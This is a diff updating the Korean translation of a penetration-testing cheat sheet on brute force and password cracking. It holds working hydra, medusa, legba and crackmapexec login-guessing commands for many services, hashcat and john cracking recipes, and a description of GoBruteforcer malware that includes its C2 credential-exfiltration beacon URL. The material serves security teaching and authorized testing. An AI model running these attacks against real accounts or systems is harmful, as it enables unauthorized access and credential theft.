@@ -1,4 +1,4 @@
-# Brute Force - 치트 시트
+# Brute Force - CheatSheet
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -19,9 +19,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **직접 사전 만들기**
+## **나만의 사전 만들기**
 
-대상에 관한 정보를 최대한 많이 수집한 다음 맞춤형 사전을 생성하세요. 도움이 될 수 있는 도구:
+대상에 관한 정보를 최대한 많이 수집하고 맞춤형 사전을 생성하세요. 도움이 될 수 있는 도구:
 
 ### Crunch
 
@@ -36,7 +36,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 crunch 6 8 -t ,@@^^%%
 ```
 
-### 웹사이트 기반 wordlists
+### 웹사이트 기반 워드리스트
 
 ```bash
 # Cewl gets words from the victims page
@@ -59,7 +59,7 @@ python3 cupp.py -h
 
 ### [Wister](https://github.com/cycurity/wister)
 
-단어 목록 생성 도구로, 단어 집합을 입력하면 해당 단어를 다양한 방식으로 조합해 특정 타깃에 사용할 독창적이고 적합한 단어 목록을 만들 수 있습니다.
+단어 목록 생성 도구로, 단어 집합을 입력하면 해당 단어에서 여러 변형을 만들어 특정 대상에 사용할 고유하고 적합한 wordlist를 생성할 수 있습니다.
 
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
@@ -82,7 +82,7 @@ Finished in 0.920s.
 
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Wordlist
+### 단어 목록
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -95,19 +95,19 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## 인터넷 전반을 대상으로 하는 bruteforcer 워크플로 (Go 기반 스캐너에서 얻은 교훈)
+## 인터넷 전반의 bruteforcer 워크플로(Go 기반 스캐너에서 얻은 교훈)
 
-GoBruteforcer 악성코드의 스캔 워크플로에서 다음 동작이 관찰되었습니다. 정확한 값은 샘플마다 다릅니다.<sup>[[1]](#references)</sup>
+GoBruteforcer malware의 스캔 워크플로에서 다음 동작이 관찰되었습니다. 정확한 값은 샘플에 따라 다릅니다.<sup>[[1]](#references)</sup>
 
-- **아키텍처에 맞게 조정된 worker pool**을 유지합니다(예: `x86_64/arm64`에서는 동시 worker 95개, `i686`에서는 85개, `armv5tel`에서는 35개, 기타 아키텍처에서는 기본값 50개). 활성 worker를 매초 확인하고 목표 수보다 적으면 대체 worker를 실행합니다. 각 worker는 종료 전에 최대 하나의 대상 IP만 처리합니다.
-- **임의의 공인 IPv4 주소**를 생성하되, 라우팅할 수 없는 것으로 명백한 범위와 일부 운영자가 제외하는 범위는 건너뜁니다. 여기에는 RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, 멀티캐스트 `>=224.0.0.0/4`, 클라우드 사용량이 많은 `/8`(`3/15/16/56`), DoD 관련 `/8`(`6/7/11/21/22/26/28/29/30/33/55/214/215`)이 포함됩니다.
-- 짧은 시간 제한(~2초)으로 **서비스 포트를 확인한** 뒤 **cleartext 로그인**(FTP/21, MySQL/3306, Postgres/5432, HTTP/80을 통한 phpMyAdmin)을 시도합니다. C2 자격 증명 가져오기에 실패하면 **소규모 내장 자격 증명 목록**을 대신 사용합니다.
-- `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>`와 같은 짧은 HTTP GET beacon을 통해 **성공 정보를 유출**합니다(서비스 코드는 `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres` 등). 일반적인 브라우저 User-Agent를 재사용해 일반 트래픽처럼 보이게 합니다.
-- **phpMyAdmin spray**는 `GET /index.php?lang=en`으로 가능성 높은 경로 약 80개를 대입하고, PMA 식별자(`pmahomme` 테마/`phpmyadmin.css`/`navigation.php`)를 감지한 뒤 `codemirror.css?v=X.Y.Z`를 분석해 인증 방식을 선택할 수 있습니다. 버전이 `<4.9`이면 GET 매개변수 `pma_username`/`pma_password`를 허용하고, 버전이 `>=4.9`이면 `server=1`, CSRF `token`, 동일한 자격 증명을 사용해 POST합니다.
+- **아키텍처에 맞게 조정된 worker pool**을 유지합니다(예: `x86_64/arm64`에서 동시 worker 95개, `i686`에서 85개, `armv5tel`에서 35개, 기타 아키텍처의 기본값은 50개). 매초 활성 worker를 확인하고 목표 수보다 적으면 새 worker를 생성합니다. 각 worker는 종료하기 전에 최대 한 개의 대상 IP를 처리합니다.
+- **임의의 공용 IPv4 주소**를 생성하되, 라우팅 불가한 것으로 명백한 범위와 운영자가 제외한 일부 범위는 건너뜁니다. 제외 범위는 RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, 멀티캐스트 `>=224.0.0.0/4`, cloud에 많이 할당된 `/8` 범위(`3/15/16/56`), DoD 관련 `/8` 범위(`6/7/11/21/22/26/28/29/30/33/55/214/215`)입니다.
+- **서비스 포트를 짧은 타임아웃(~2초)으로 탐색**한 뒤 평문 로그인(FTP/21, MySQL/3306, Postgres/5432, HTTP/80을 통한 phpMyAdmin)을 시도합니다. C2에서 credential을 가져오지 못하면 **내장된 소규모 credential 목록**을 대신 사용합니다.
+- `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>`와 같은 작은 HTTP GET beacon을 사용해 **발견한 정보를 유출**합니다(서비스 코드는 `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres` 등). 일반적인 브라우저 User-Agent를 재사용해 트래픽을 정상적인 것처럼 보이게 합니다.
+- **phpMyAdmin spray**는 `GET /index.php?lang=en`으로 가능성이 높은 경로 약 80개를 bruteforce하고, PMA marker(`pmahomme` theme/`phpmyadmin.css`/`navigation.php`)를 감지한 뒤 `codemirror.css?v=X.Y.Z`를 파싱해 인증 방식을 분기할 수 있습니다. 버전이 `<4.9`이면 GET 파라미터 `pma_username`/`pma_password`를 허용하고, 버전이 `>=4.9`이면 `server=1`, CSRF `token` 및 동일한 credential을 포함한 POST를 사용합니다.
 
 ## 서비스
 
-서비스 이름을 기준으로 알파벳순 정렬했습니다.
+서비스 이름의 알파벳순입니다.
 
 ### AFP
 
@@ -156,7 +156,7 @@ msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
 ```
 
-### Docker Registry
+### Docker 레지스트리
 
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
@@ -177,11 +177,11 @@ medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
 
-### HTTP 일반 Brute Force
+### HTTP 일반 Brute
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
-### HTTP Basic Auth
+### HTTP 기본 인증
 
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
@@ -206,7 +206,7 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordl
 
 http**s**의 경우 "http-post-form"을 "**https-post-form"으로 변경해야 합니다.
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
+### **HTTP - CMS --** (W)ordpress, (J)oomla 또는 (D)rupal 또는 (M)oodle
 
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
@@ -384,7 +384,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 
 ### PPTP
 
-[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)에서 설치할 `.deb` 패키지를 다운로드할 수 있습니다.
+[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)에서 다운로드하여 설치할 수 있습니다.
 
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
@@ -511,13 +511,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
 
-#### 취약한 SSH 키 / Debian의 예측 가능한 PRNG
+#### 취약한 SSH 키 / Debian 예측 가능한 PRNG
 
-일부 시스템에는 암호화 자료를 생성하는 데 사용되는 난수 시드에 알려진 결함이 있습니다. 이로 인해 키 공간이 크게 줄어들어 [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)와 같은 도구로 brute-force 공격을 수행할 수 있습니다. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)와 같이 미리 생성된 취약한 키 모음도 제공됩니다.
+일부 시스템에는 암호화 자료를 생성하는 데 사용되는 random seed에 알려진 결함이 있습니다. 이로 인해 keyspace가 크게 줄어들어 [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)와 같은 도구로 bruteforce할 수 있습니다. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)와 같이 미리 생성된 취약한 키 모음도 제공됩니다.
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-STOMP 텍스트 프로토콜은 RabbitMQ, ActiveMQ, HornetQ, OpenMQ와 같은 인기 있는 메시지 큐 서비스와 **원활하게 통신하고 상호 작용할 수 있도록 하는** 널리 사용되는 메시징 프로토콜입니다. 메시지를 교환하고 다양한 메시징 작업을 수행할 수 있는 표준화되고 효율적인 방식을 제공합니다.
+STOMP 텍스트 프로토콜은 RabbitMQ, ActiveMQ, HornetQ, OpenMQ와 같은 인기 있는 메시지 큐 서비스와의 **원활한 통신 및 상호작용을 지원하는** 널리 사용되는 메시징 프로토콜입니다. 표준화되고 효율적인 방식으로 메시지를 교환하고 다양한 메시징 작업을 수행할 수 있습니다.
 
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
@@ -569,8 +569,8 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ### 온라인 cracking 데이터베이스
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 및 SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (ESS/SSP 유무와 관계없이, 모든 challenge 값으로 MSCHAPv2/PPTP-VPN/NetNTLMv1)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash, WPA2 캡처 및 MSOffice, ZIP, PDF 등의 아카이브)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (ESS/SSP 유무에 관계없이, 모든 challenge 값으로 MSCHAPv2/PPTP-VPN/NetNTLMv1)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash, WPA2 캡처, MSOffice, ZIP, PDF 등의 아카이브...)
 - [https://crackstation.net/](https://crackstation.net) (Hash)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
 - [https://gpuhash.me/](https://gpuhash.me) (Hash 및 파일 Hash)
@@ -580,7 +580,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Hash를 brute force하기 전에 이 사이트를 확인해 보세요.
+Hash를 brute force하기 전에 확인해 보세요.
 
 ### ZIP
 
@@ -602,8 +602,8 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 
 #### Known plaintext zip attack
 
-암호화된 zip 안에 포함된 파일의 **plaintext**(또는 plaintext 일부)를 알고 있어야 합니다. 암호화된 zip 안에 포함된 파일의 **파일 이름과 크기**는 **`7z l encrypted.zip`**을 실행해 확인할 수 있습니다.\
-릴리스 페이지에서 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)을 다운로드하세요.
+**plaintext**(또는 plaintext의 일부), 즉 **암호화된 zip 내부에 포함된 파일의 내용**을 알고 있어야 합니다. 암호화된 zip 내부에 포함된 파일의 **파일 이름과 크기**는 **`7z l encrypted.zip`**을 실행해 확인할 수 있습니다.\
+[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)을 릴리스 페이지에서 다운로드하세요.
 
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -641,9 +641,9 @@ sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 
-### PDF 소유자 비밀번호
+### PDF Owner Password
 
-PDF 소유자 비밀번호를 crack하려면 다음을 확인하세요: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+PDF Owner password를 크랙하려면 다음을 확인하세요: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 
@@ -732,14 +732,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)를 사용한 다음 john을 실행하세요.
+[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)을 사용한 다음 john을 실행하세요.
 
-### Open Office 암호로 보호된 열
+### Open Office 비밀번호로 보호된 열
 
-암호로 보호된 열이 있는 xlsx 파일이 있다면 보호를 해제할 수 있습니다.
+비밀번호로 보호된 열이 있는 xlsx 파일이 있다면 보호를 해제할 수 있습니다.
 
-- **Google Drive에 업로드**하면 암호가 자동으로 제거됩니다.
-- **수동으로** 보호를 **해제**하려면:
+- **Google Drive에 업로드**하면 비밀번호가 자동으로 제거됩니다.
+- **수동으로 제거**하려면:
 
 ```bash
 unzip file.xlsx
@@ -770,16 +770,16 @@ hash-identifier
 > <HASH>
 ```
 
-### 단어 목록
+### 워드리스트
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **단어 목록 생성 도구**
+### **워드리스트 생성 도구**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 기본 문자, 키맵, 경로를 설정할 수 있는 고급 키보드 워크 생성기.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 기본 문자, 키맵, 경로를 구성할 수 있는 고급 keyboard-walk 생성기.
 
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
@@ -787,7 +787,7 @@ kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction
 
 ### John mutation
 
-_**/etc/john/john.conf**_을 읽고 설정합니다.
+_**/etc/john/john.conf**_을 읽고 구성합니다.
 
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
@@ -796,20 +796,48 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 ### Hashcat
 
-#### Hashcat attacks
+#### Hashcat 공격
 
-- **Wordlist attack** (`-a 0`) with rules
+- **Wordlist attack** (`-a 0`)과 rules 사용
 
-**Hashcat**에는 이미 **rules가 포함된 폴더**가 있지만, [**여기에서 다른 흥미로운 rules를 찾을 수 있습니다**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat**에는 이미 **rules가 들어 있는 폴더**가 포함되어 있지만, [**여기에서 다른 유용한 rules를 찾을 수 있습니다**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 
-- **Wordlist combinator** attack
+#### rule 파일 설명 및 프로파일링
 
-hashcat을 사용하면 **2개의 wordlist를 1개로 결합**할 수 있습니다.\
-첫 번째 목록에 **"hello"**라는 단어가 있고 두 번째 목록에 **"world"**와 **"earth"**라는 단어가 각각 한 줄씩 있다면, `helloworld`와 `helloearth`가 생성됩니다.
+Hashcat rule은 opcode를 왼쪽에서 오른쪽으로 실행합니다. 연산이 위치 0에서 작동할 때는 쉽게 잘못 이해할 수 있습니다. `^e ^h ^t`는 `e`를 앞에 붙인 다음 `h`, 이어서 `t`를 앞에 붙이므로 `password`를 `thepassword`로 바꿉니다. 치환은 대소문자를 구분하는 바이트 비교이므로 `sa@`와 같은 rule은 대문자 `A`에 아무런 영향을 주지 않습니다. 익숙하지 않은 rule은 GPU 시간을 들이기 전에 소문자, 대문자, 대소문자가 섞인 대표적인 baseword에 적용해 테스트하세요.<sup>[[6]](#references)[[9]](#references)</sup>
+
+[HashcatRosetta](https://github.com/bandrel/HashcatRosetta)는 모든 중간 후보를 표시하고 전체 rule 파일의 opcode 분포를 요약할 수 있습니다. 정적 opcode 개수를 보면 파일이 주로 문자를 뒤에 붙이는지, 앞에 붙이는지, 치환하는지, 잘라내는지 알 수 있습니다. 이 정보만으로 rule이 비밀번호를 크랙할 수 있다고 단정할 수는 없지만, 대상 집단에서 관찰된 비밀번호 패턴에 맞는 rule 세트를 선택하는 데 도움이 됩니다.<sup>[[6]](#references)[[9]](#references)</sup>
+
+```bash
+uv tool install git+https://github.com/bandrel/HashcatRosetta.git
+hashcat-rosetta --explain '^e ^h ^t' --baseword password
+hashcat-rosetta rules.rule --analyze-rules
+```
+
+#### debug 로그로 중복 규칙 줄이기
+
+Hashcat debug mode은 규칙 변환 기록을 일반 상태 및 결과 출력과 별도로 저장합니다. Mode `4`는 `baseword:rule:candidate`를 기록하고, mode `5`는 원본 wordlist를 덧붙입니다. 항상 `--debug-file`을 명시적으로 지정하세요. 지정하지 않으면 Hashcat은 프로필 디렉터리의 `hashcat.debugfile`을 열며, stdout을 리디렉션해도 이러한 기록이 아니라 콘솔 스트림이 캡처됩니다. Debug 파일은 append mode로 열리므로 새 측정을 시작하기 전에 기존 파일을 삭제하거나 교체하고, 평문 baseword와 candidate가 포함되어 있으므로 파일을 보호하세요.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
+
+```bash
+rm -f debug.txt
+hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
+  -r rules.rule hashes.txt wordlist.txt
+hashcat-rosetta debug.txt --rules --metric candidates --top 25
+hashcat-rosetta debug.txt --basewords --detail
+hashcat-rosetta debug.txt --wordlists --detail
+hashcat-rosetta debug.txt --export report.json --format json
+```
+
+`frequency`를 사용하면 가장 자주 적용된 규칙을 찾고, `basewords`를 사용하면 서로 다른 입력의 범위를 측정하며, `candidates`를 사용하면 서로 다른 출력의 수를 셀 수 있습니다. 규칙이 자주 적용되더라도 여러 입력이 중복 후보로 합쳐질 수 있으므로, 후보 순위를 확인하는 것이 보통 목록을 줄이기 위한 가장 좋은 출발점입니다. 값이 높은 규칙을 더 작은 파일에 복사하고, 남은 해시를 대상으로 다시 실행한 다음 실행 간 보고서를 비교하세요. Mode `5`는 각 원본 wordlist가 유용한 basewords를 제공하는지도 보여 줍니다. 데이터에 콜론이 있어 자동 감지가 모호할 때는 `--debug-mode 4` 또는 `--debug-mode 5`로 파싱을 강제하세요.<sup>[[6]](#references)[[9]](#references)</sup>
+
+- **Wordlist combinator** 공격
+
+hashcat으로 **2개의 wordlist를 하나로 결합**할 수 있습니다.\
+첫 번째 목록에 **"hello"**라는 단어가 있고 두 번째 목록에 **"world"**와 **"earth"**라는 단어가 있는 2개의 줄이 있다면 `helloworld`와 `helloearth`가 생성됩니다.
 
 ```bash
 # This will combine 2 wordlists
@@ -822,20 +850,20 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
 
-#### Grammar-driven combinator attacks (암호화된 Office 예시)
+#### 문법 기반 조합 공격 (암호화된 Office 예시)
 
-암호는 길고 여러 문자 클래스를 포함하더라도, 알려진 문법을 따르는 경우 **실효 검색 공간**이 작을 수 있습니다. 승인된 평가 중 입수한 암호화된 Office 문서에서 `office2john.py`는 암호 검증 레코드를 추출합니다. 이를 통해 온라인 잠금, 요청 제한 또는 MFA 없이 로컬에서 추측할 수 있습니다. 문서 암호화를 우회하는 것은 아닙니다.<sup>[[2]](#references)[[5]](#references)</sup>
+비밀번호가 길고 여러 문자 클래스를 포함하더라도, 알려진 문법을 따르는 경우 **실질적인 검색 공간**은 작을 수 있습니다. 승인된 assessment 중 확보한 암호화된 Office 문서에 `office2john.py`를 실행하면 비밀번호 검증 레코드를 추출할 수 있습니다. 이를 이용하면 온라인 잠금, 요청 제한 또는 MFA 없이 로컬에서 추측을 시도할 수 있습니다. 문서 암호화를 우회하는 것은 아닙니다.<sup>[[2]](#references)[[5]](#references)</sup>
 
-John이 앞에 붙이는 파일 이름 필드를 제거해 Hashcat이 검증 정보만 받도록 합니다:<sup>[[2]](#references)</sup>
+John이 앞에 추가하는 파일 이름 필드를 제거해 Hashcat이 검증자만 받도록 합니다:<sup>[[2]](#references)</sup>
 
 ```bash
 python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
 head -c 40 office.hash; echo
 ```
 
-파일 확장자가 아니라 추출한 접두사를 기준으로 `-m`을 선택합니다. Hashcat은 `$office$*2007*`, `$office$*2010*`, `$office$*2013*`을 각각 모드 `9400`, `9500`, `9600`에 매핑합니다. 레거시 `$oldoffice$0/$1` 및 `$oldoffice$3/$4` 레코드는 각각 모드 `9700` 및 `9800`을 사용합니다.<sup>[[3]](#references)</sup>
+파일 확장자가 아니라 추출된 접두사를 기준으로 `-m`을 선택합니다. Hashcat은 `$office$*2007*`, `$office$*2010*`, `$office$*2013*`을 각각 모드 `9400`, `9500`, `9600`에 매핑합니다. 레거시 `$oldoffice$0/$1` 및 `$oldoffice$3/$4` 레코드는 각각 모드 `9700` 및 `9800`을 사용합니다.<sup>[[3]](#references)</sup>
 
-password reuse, 정책, 힌트 또는 사용자에 대해 잘 아는 사람에게서 `<word><number><optional !><word>`와 같은 패턴을 파악했다면, 독립적으로 열거할 수 있는 접두사를 왼쪽 dictionary로 만듭니다. 이 예시는 숫자 `0`부터 `99`까지 테스트합니다. 범위와 변환은 평가 과정에서 얻은 근거에 맞게 바꾸세요.<sup>[[5]](#references)</sup>
+비밀번호 재사용, 정책, 힌트 또는 사용자를 잘 아는 사람에게서 얻은 정보로 `<word><number><optional !><word>`와 같은 문법이 드러나면, 독립적으로 열거할 수 있는 접두사를 왼쪽 사전으로 구성합니다. 이 예시에서는 숫자 `0`부터 `99`까지를 테스트합니다. 평가에서 얻은 증거에 따라 범위와 변환을 바꾸세요.<sup>[[5]](#references)</sup>
 
 ```bash
 while IFS= read -r word; do
@@ -845,13 +873,13 @@ while IFS= read -r word; do
 done < words.txt > wordsAndNumbers.txt
 ```
 
-Hashcat attack mode `1`은 오른쪽 dictionary의 각 줄을 왼쪽 dictionary의 각 줄에 추가하므로, `L`줄과 `R`줄이 들어 있는 파일은 적용된 rules를 적용하기 전에 `L × R`개의 후보를 생성합니다. 다음 명령은 legacy `$oldoffice$3/$4` record 전용입니다. 다른 Office 형식에는 mode를 변경하세요.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Hashcat attack mode `1`은 오른쪽 dictionary의 각 줄을 왼쪽 dictionary의 각 줄 뒤에 붙이므로, 각각 `L`줄과 `R`줄이 있는 파일은 rules를 적용하기 전에 `L × R`개의 후보를 생성합니다. 다음 명령은 기존 `$oldoffice$3/$4` 레코드 전용입니다. 다른 Office 형식에는 mode를 변경하세요.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
 ```bash
 hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
 ```
 
-이 전처리 패턴은 오프라인에서 검증 가능한 다른 형식에도 적용할 수 있습니다. 명목상 전체 길이를 brute-force하는 대신, 한 구성 요소에 대해 그럴듯한 대소문자, 날짜, 구분자, 숫자 또는 문장 부호만 열거한 다음 나머지 구성 요소와 결합합니다.<sup>[[4]](#references)[[5]](#references)</sup>
+이 전처리 패턴은 오프라인에서 검증할 수 있는 다른 형식에도 적용할 수 있습니다. 전체 길이를 무작정 brute-force하는 대신, 한 구성 요소에 대해 그럴듯한 대소문자 조합, 날짜, 구분자, 숫자 또는 문장 부호만 열거한 다음 나머지 구성 요소와 조합합니다.<sup>[[4]](#references)[[5]](#references)</sup>
 
 - **Mask attack** (`-a 3`)
 
@@ -887,6 +915,16 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
 
+#### 실행 전에 `.hcmask` 파일 검증
+
+잘못된 줄이 유효한 마스크 사이에 섞여 누락될 수 있으므로 공격을 시작하기 전에 파일 전체와 예상 키스페이스를 검증하세요. HashcatRosetta는 문제가 있는 줄을 보고하고 마스크가 하나라도 유효하지 않으면 0이 아닌 상태 코드를 반환하므로, 스크립트나 CI에서 확인하는 데 적합합니다.<sup>[[6]](#references)[[9]](#references)</sup>
+
+```bash
+hashcat-rosetta masks.hcmask --verify-masks
+```
+
+일반적인 CSV 또는 텍스트 파서로 mask 파일을 정규화하지 마세요. Hashcat은 `?1`부터 `?8`까지의 custom charset을 지원하고, `#`이 첫 바이트일 때만 주석으로 처리하며, `?` 토큰을 해석하기 전에 백슬래시 이스케이프를 한 번에 제거합니다. 따라서 `#` 앞의 공백은 mask 데이터가 되고, 이스케이프 처리에 따라 시퀀스가 리터럴인지 charset 토큰인지 달라질 수 있습니다.<sup>[[6]](#references)[[9]](#references)</sup>
+
 - Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) 공격
 
 ```bash
@@ -903,7 +941,7 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
 
-Linux Hashes 크래킹 - /etc/shadow 파일
+Linux 해시 크래킹 - /etc/shadow 파일
 
 ```
  500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
@@ -933,9 +971,13 @@ Windows 해시 크래킹
 
 ## References
 
-- [1] [GoBruteforcer 내부: AI 생성 서버 기본 설정, 취약한 비밀번호, 암호화폐 중심 캠페인](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [1] [GoBruteforcer 내부: AI가 생성한 서버 기본 설정, 취약한 비밀번호, 암호화폐 중심 캠페인](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 - [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
 - [3] [Hashcat 예제 해시 및 Microsoft Office 모드](https://hashcat.net/wiki/doku.php?id=example_hashes)
 - [4] [Hashcat 조합 공격](https://hashcat.net/wiki/doku.php?id=combinator_attack)
 - [5] [자격 증명 상속 계획](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
+- [6] [HashcatRosetta 저장소](https://github.com/bandrel/HashcatRosetta)
+- [7] [Hashcat 디버그 파일 구현](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
+- [8] [Hashcat 명령줄 도움말](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
+- [9] [HashcatRosetta: 비밀번호 크래킹의 로제타석 읽기](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
 {{#include ../banners/hacktricks-training.md}}
